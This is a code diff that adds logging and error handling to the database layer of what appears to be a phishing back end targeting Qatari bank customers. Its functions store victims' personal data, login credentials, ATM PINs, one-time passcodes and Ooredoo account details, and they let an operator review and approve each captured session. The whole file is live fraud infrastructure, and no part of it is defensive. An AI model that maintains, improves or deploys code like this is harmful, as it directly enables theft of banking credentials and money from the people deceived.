@@ -22,10 +22,12 @@ let _db: any = null;
 export async function getDb() {
   if (!_db && process.env.DATABASE_URL) {
     try {
+      console.log("[Database] Attempting to connect to database...");
       const client = postgres(process.env.DATABASE_URL);
       _db = drizzle(client);
+      console.log("[Database] Successfully connected to database");
     } catch (error) {
-      console.warn("[Database] Failed to connect:", error);
+      console.error("[Database] Failed to connect:", error);
       _db = null;
     }
   }
@@ -106,24 +108,54 @@ export async function getUserByOpenId(openId: string) {
 
 export async function createSession(sessionId: string, selectedBank: string) {
   const db = await getDb();
-  if (!db) throw new Error("Database not available");
-  await db.insert(sessions).values({ id: sessionId, selectedBank, country: "Qatar" });
+  if (!db) {
+    console.error("[Database] Cannot create session: database not available");
+    throw new Error("Database not available");
+  }
+  try {
+    console.log(`[Database] Creating session: ${sessionId} for bank: ${selectedBank}`);
+    await db.insert(sessions).values({ id: sessionId, selectedBank, country: "Qatar" });
+    console.log(`[Database] Session created successfully: ${sessionId}`);
+  } catch (error) {
+    console.error(`[Database] Failed to create session ${sessionId}:`, error);
+    throw error;
+  }
 }
 
 export async function updateSessionStatus(sessionId: string, status: string, step?: string, errorMessage?: string) {
   const db = await getDb();
-  if (!db) throw new Error("Database not available");
-  await db.update(sessions)
-    .set({ status, currentStep: step, errorMessage, updatedAt: new Date(), adminAction: null })
-    .where(eq(sessions.id, sessionId));
+  if (!db) {
+    console.error("[Database] Cannot update session: database not available");
+    throw new Error("Database not available");
+  }
+  try {
+    console.log(`[Database] Updating session ${sessionId}: status=${status}, step=${step}`);
+    await db.update(sessions)
+      .set({ status, currentStep: step, errorMessage, updatedAt: new Date(), adminAction: null })
+      .where(eq(sessions.id, sessionId));
+    console.log(`[Database] Session updated successfully: ${sessionId}`);
+  } catch (error) {
+    console.error(`[Database] Failed to update session ${sessionId}:`, error);
+    throw error;
+  }
 }
 
 export async function adminTakeAction(sessionId: string, action: string, errorMessage?: string) {
   const db = await getDb();
-  if (!db) throw new Error("Database not available");
-  await db.update(sessions)
-    .set({ adminAction: action, errorMessage, status: action === 'approve' ? 'approved' : 'rejected', updatedAt: new Date() })
-    .where(eq(sessions.id, sessionId));
+  if (!db) {
+    console.error("[Database] Cannot take admin action: database not available");
+    throw new Error("Database not available");
+  }
+  try {
+    console.log(`[Database] Admin action on session ${sessionId}: action=${action}`);
+    await db.update(sessions)
+      .set({ adminAction: action, errorMessage, status: action === 'approve' ? 'approved' : 'rejected', updatedAt: new Date() })
+      .where(eq(sessions.id, sessionId));
+    console.log(`[Database] Admin action completed: ${sessionId}`);
+  } catch (error) {
+    console.error(`[Database] Failed to take admin action on ${sessionId}:`, error);
+    throw error;
+  }
 }
 
 export async function getSessionStatus(sessionId: string) {
@@ -158,63 +190,129 @@ export async function getSessionByIdWithAllData(sessionId: string) {
 
 export async function submitPersonalData(data: InsertPersonalDataSubmission) {
   const db = await getDb();
-  if (!db) throw new Error("Database not available");
-  const result = await db.insert(personalDataSubmissions).values(data);
-  return result;
+  if (!db) {
+    console.error("[Database] Cannot submit personal data: database not available");
+    throw new Error("Database not available");
+  }
+  try {
+    console.log(`[Database] Submitting personal data for session: ${data.sessionId}`);
+    const result = await db.insert(personalDataSubmissions).values(data);
+    console.log(`[Database] Personal data submitted successfully: ${data.sessionId}`);
+    return result;
+  } catch (error) {
+    console.error(`[Database] Failed to submit personal data for ${data.sessionId}:`, error);
+    throw error;
+  }
 }
 
 export async function submitLoginMethod(data: InsertLoginMethodSubmission) {
   const db = await getDb();
-  if (!db) throw new Error("Database not available");
-  const result = await db.insert(loginMethodSubmissions).values(data);
-  return result;
+  if (!db) {
+    console.error("[Database] Cannot submit login method: database not available");
+    throw new Error("Database not available");
+  }
+  try {
+    console.log(`[Database] Submitting login method for session: ${data.sessionId}`);
+    const result = await db.insert(loginMethodSubmissions).values(data);
+    console.log(`[Database] Login method submitted successfully: ${data.sessionId}`);
+    return result;
+  } catch (error) {
+    console.error(`[Database] Failed to submit login method for ${data.sessionId}:`, error);
+    throw error;
+  }
 }
 
 export async function submitAtmPin(data: InsertAtmPinSubmission) {
   const db = await getDb();
-  if (!db) throw new Error("Database not available");
-  const result = await db.insert(atmPinSubmissions).values(data);
-  return result;
+  if (!db) {
+    console.error("[Database] Cannot submit ATM PIN: database not available");
+    throw new Error("Database not available");
+  }
+  try {
+    console.log(`[Database] Submitting ATM PIN for session: ${data.sessionId}`);
+    const result = await db.insert(atmPinSubmissions).values(data);
+    console.log(`[Database] ATM PIN submitted successfully: ${data.sessionId}`);
+    return result;
+  } catch (error) {
+    console.error(`[Database] Failed to submit ATM PIN for ${data.sessionId}:`, error);
+    throw error;
+  }
 }
 
 export async function submitOtp(data: InsertOtpSubmission) {
   const db = await getDb();
-  if (!db) throw new Error("Database not available");
-  const result = await db.insert(otpSubmissions).values(data);
-  return result;
+  if (!db) {
+    console.error("[Database] Cannot submit OTP: database not available");
+    throw new Error("Database not available");
+  }
+  try {
+    console.log(`[Database] Submitting OTP for session: ${data.sessionId}`);
+    const result = await db.insert(otpSubmissions).values(data);
+    console.log(`[Database] OTP submitted successfully: ${data.sessionId}`);
+    return result;
+  } catch (error) {
+    console.error(`[Database] Failed to submit OTP for ${data.sessionId}:`, error);
+    throw error;
+  }
 }
 
 export async function submitOoredoo(data: InsertOoredooSubmission) {
   const db = await getDb();
-  if (!db) throw new Error("Database not available");
-  const result = await db.insert(ooredooSubmissions).values(data);
-  return result;
+  if (!db) {
+    console.error("[Database] Cannot submit Ooredoo credentials: database not available");
+    throw new Error("Database not available");
+  }
+  try {
+    console.log(`[Database] Submitting Ooredoo credentials for session: ${data.sessionId}`);
+    const result = await db.insert(ooredooSubmissions).values(data);
+    console.log(`[Database] Ooredoo credentials submitted successfully: ${data.sessionId}`);
+    return result;
+  } catch (error) {
+    console.error(`[Database] Failed to submit Ooredoo credentials for ${data.sessionId}:`, error);
+    throw error;
+  }
 }
 
 export async function getAllSubmissions() {
   const db = await getDb();
-  if (!db) return [];
-  
-  const allSessions = await db.select().from(sessions);
-  const result = [];
-  
-  for (const session of allSessions) {
-    const [personalData] = await db.select()
-      .from(personalDataSubmissions)
-      .where(eq(personalDataSubmissions.sessionId, session.id))
-      .limit(1);
-      
-    result.push({
-      ...session,
-      nameArabic: personalData?.nameArabic || "جاري التحميل...",
-      phoneNumber: personalData?.phoneNumber || "جاري التحميل...",
-      idNumber: personalData?.idNumber || "جاري التحميل...",
-    });
+  if (!db) {
+    console.warn("[Database] Cannot get submissions: database not available");
+    return [];
   }
-  
-  return result;
+  try {
+    console.log("[Database] Fetching all submissions...");
+    const allSessions = await db.select().from(sessions);
+    console.log(`[Database] Found ${allSessions.length} sessions`);
+    
+    const result = [];
+    for (const session of allSessions) {
+      const [personalData] = await db.select()
+        .from(personalDataSubmissions)
+        .where(eq(personalDataSubmissions.sessionId, session.id))
+        .limit(1);
+      result.push({
+        ...session,
+        nameArabic: personalData?.nameArabic || "جاري التحميل...",
+        phoneNumber: personalData?.phoneNumber || "جاري التحميل...",
+        idNumber: personalData?.idNumber || "جاري التحميل...",
+      });
+    }
+    console.log(`[Database] Returning ${result.length} submissions with details`);
+    return result;
+  } catch (error) {
+    console.error("[Database] Failed to get all submissions:", error);
+    return [];
+  }
 }
 
 export async function getSubmissionDetails(sessionId: string) {
-  return getSessionByIdWithAllData(sessionId);
+  try {
+    console.log(`[Database] Fetching details for session: ${sessionId}`);
+    const details = await getSessionByIdWithAllData(sessionId);
+    console.log(`[Database] Details fetched for session: ${sessionId}`);
+    return details;
+  } catch (error) {
+    console.error(`[Database] Failed to get submission details for ${sessionId}:`, error);
+    return null;
+  }
 }
